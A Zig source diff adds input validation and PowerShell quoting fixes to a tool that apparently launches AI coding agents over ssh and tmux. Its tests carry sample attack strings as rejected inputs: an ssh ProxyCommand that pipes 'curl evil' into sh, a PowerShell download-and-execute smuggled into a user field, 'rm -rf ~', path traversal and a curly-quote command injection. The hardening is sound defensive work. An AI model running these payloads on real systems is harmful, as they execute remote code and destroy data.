@@ -216,12 +216,33 @@ pub fn shQuote(ctx: Ctx, value: []const u8) ![]u8 {
     return out.items;
 }
 
-/// PowerShell single-quoting: 'it''s'. Windows' sshd hands commands to PowerShell.
+/// The bytes at the start of `value` that PowerShell reads as a single quote:
+/// the ASCII one and the typographic family U+2018..U+201B (E2 80 98..9B), each
+/// of which closes a single-quoted string. Zero when the next character is not one.
+fn psQuoteRun(value: []const u8) usize {
+    if (value[0] == '\'') return 1;
+    if (value.len >= 3 and value[0] == 0xE2 and value[1] == 0x80 and value[2] >= 0x98 and value[2] <= 0x9B) return 3;
+    return 0;
+}
+
+/// PowerShell single-quoting: 'it''s'. Windows' sshd hands commands to PowerShell,
+/// and its tokenizer ends a single-quoted string on a curly quote as readily as on
+/// the ASCII one — dictated Portuguese is full of them — so every character of that
+/// family is doubled, not just '.
 pub fn psQuote(ctx: Ctx, value: []const u8) ![]u8 {
     var out: std.ArrayList(u8) = .empty;
     try out.append(ctx.gpa, '\'');
-    for (value) |c| {
-        if (c == '\'') try out.appendSlice(ctx.gpa, "''") else try out.append(ctx.gpa, c);
+    var i: usize = 0;
+    while (i < value.len) {
+        const quote = psQuoteRun(value[i..]);
+        if (quote == 0) {
+            try out.append(ctx.gpa, value[i]);
+            i += 1;
+            continue;
+        }
+        try out.appendSlice(ctx.gpa, value[i .. i + quote]);
+        try out.appendSlice(ctx.gpa, value[i .. i + quote]);
+        i += quote;
     }
     try out.append(ctx.gpa, '\'');
     return out.items;
@@ -254,17 +275,49 @@ pub fn fromMsys(ctx: Ctx, path: []const u8) ![]u8 {
     return ctx.gpa.dupe(u8, path);
 }
 
+/// Task names, machine names: a single path component and never a flag. "." and
+/// ".." are directory entries, not names — ~/agents/.. is the home directory,
+/// and an agent started there runs with every permission skipped over the whole
+/// account. A leading "-" would be read as an option by the tool that receives it.
 pub fn validSlug(value: []const u8) bool {
-    if (value.len == 0 or value.len > 60) return false;
+    if (value.len == 0 or value.len > 60 or value[0] == '-') return false;
     for (value) |c| if (!(std.ascii.isAlphanumeric(c) or c == '.' or c == '_' or c == '-')) return false;
+    return std.mem.indexOfNone(u8, value, ".") != null;
+}
+
+/// Repository names or paths; no backslashes (they break through PowerShell),
+/// nothing a shell would interpret, no ".." to climb out of the repo roots and
+/// no leading "-" for the tool that receives it.
+pub fn validRepo(value: []const u8) bool {
+    if (value.len == 0 or value[0] == '-') return false;
+    for (value) |c| if (!(std.ascii.isAlphanumeric(c) or std.mem.indexOfScalar(u8, "._/:~-", c) != null)) return false;
+    var parts = std.mem.splitScalar(u8, value, '/');
+    while (parts.next()) |part| if (std.mem.eql(u8, part, "..")) return false;
     return true;
 }
 
-/// Repository names or paths; no backslashes (they break through PowerShell) and
-/// nothing a shell would interpret.
-pub fn validRepo(value: []const u8) bool {
-    if (value.len == 0) return false;
-    for (value) |c| if (!(std.ascii.isAlphanumeric(c) or std.mem.indexOfScalar(u8, "._/:~-", c) != null)) return false;
+/// An ssh destination from the registry. It becomes an argv element of ssh and
+/// scp, where a value starting with "-" is an option and not a host
+/// (-oProxyCommand=… runs a command on *this* machine), and its user part is
+/// interpolated into a Windows path and a PowerShell command on the far side.
+/// The registry is rewritten by `agb deploy` from another machine, so it is
+/// input, not configuration.
+pub fn validSshTarget(value: []const u8) bool {
+    if (value.len == 0 or value.len > 253 or value[0] == '-') return false;
+    var users: usize = 0;
+    for (value) |c| {
+        if (c == '@') users += 1 else if (!(std.ascii.isAlphanumeric(c) or c == '.' or c == '_' or c == '-')) return false;
+    }
+    return users <= 1;
+}
+
+/// A tmux session name this machine may be asked to address. tmux splits a
+/// target at ":" (session:window.pane), so `=a:b` names session "a": a session
+/// whose name holds one cannot be addressed, and aiming somewhere else instead
+/// would send keys to — or kill — a different session.
+pub fn validTarget(value: []const u8) bool {
+    if (value.len == 0 or value.len > 200) return false;
+    for (value) |c| if (c == ':' or c == '\n' or c == '\r' or c == 0) return false;
     return true;
 }
 
@@ -306,6 +359,60 @@ test "quoting, paths and slugs" {
     try std.testing.expect(validRepo("C:/dev/coreum"));
     try std.testing.expect(!validRepo("x; rm -rf ~"));
     try std.testing.expect(!validRepo("C:\\dev"));
+}
+
+test "a name is one component, never a flag and never a directory entry" {
+    // ~/agents/.. is the home directory: an agent there skips every permission
+    // over the whole account, and the home directory is written into Claude's
+    // trusted projects.
+    try std.testing.expect(!validSlug(".."));
+    try std.testing.expect(!validSlug("."));
+    try std.testing.expect(!validSlug("..."));
+    try std.testing.expect(!validSlug("-d"));
+    try std.testing.expect(validSlug("v1.2"));
+    try std.testing.expect(!validRepo("../../etc"));
+    try std.testing.expect(!validRepo("a/../../b"));
+    try std.testing.expect(!validRepo("-oProxyCommand=x"));
+    try std.testing.expect(validRepo("~/dev/coreum"));
+}
+
+test "an ssh destination cannot be an ssh option" {
+    // ssh has no "--": a destination starting with "-" is read as an option, and
+    // -oProxyCommand=… runs a command on this machine before any connection.
+    try std.testing.expect(!validSshTarget("-oProxyCommand=curl evil|sh"));
+    try std.testing.expect(!validSshTarget("-J"));
+    try std.testing.expect(!validSshTarget("a'; iex(iwr x); #@host"));
+    try std.testing.expect(!validSshTarget("user@host:path"));
+    try std.testing.expect(!validSshTarget("a@b@c"));
+    try std.testing.expect(!validSshTarget(""));
+    try std.testing.expect(validSshTarget("frb@macbook-pro"));
+    try std.testing.expect(validSshTarget("Micromed@felipe-windows"));
+    try std.testing.expect(validSshTarget("100.64.0.1"));
+}
+
+test "a session name that tmux would read as another session is refused" {
+    try std.testing.expect(!validTarget("coreum:1"));
+    try std.testing.expect(!validTarget("a\nb"));
+    try std.testing.expect(!validTarget(""));
+    try std.testing.expect(validTarget("coreum-login-bug"));
+    try std.testing.expect(validTarget("a.b"));
+}
+
+test "PowerShell quoting survives a curly apostrophe" {
+    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
+    defer arena.deinit();
+    var env = std.process.Environ.Map.init(arena.allocator());
+    const ctx = Ctx{ .io = std.testing.io, .gpa = arena.allocator(), .env = &env };
+    // U+2018..U+201B close a single-quoted string in PowerShell exactly as '
+    // does, and Deepgram writes the curly one into every dictated contraction.
+    try std.testing.expectEqualStrings("'n\u{2019}\u{2019}o'", try psQuote(ctx, "n\u{2019}o"));
+    try std.testing.expectEqualStrings("'\u{2018}\u{2018}x\u{201B}\u{201B}'", try psQuote(ctx, "\u{2018}x\u{201B}"));
+    try std.testing.expectEqualStrings("'a\u{201A}\u{201A}b'", try psQuote(ctx, "a\u{201A}b"));
+    // A quote that does not end a string is left exactly as it was.
+    try std.testing.expectEqualStrings("'2\u{2032}'", try psQuote(ctx, "2\u{2032}"));
+    try std.testing.expectEqualStrings("'\u{FF07}'", try psQuote(ctx, "\u{FF07}"));
+    const injection = try psQuote(ctx, "a\u{2019}; Write-Output PWNED; \u{2019}");
+    try std.testing.expectEqualStrings("'a\u{2019}\u{2019}; Write-Output PWNED; \u{2019}\u{2019}'", injection);
 }
 
 test "one instance holds the lock" {
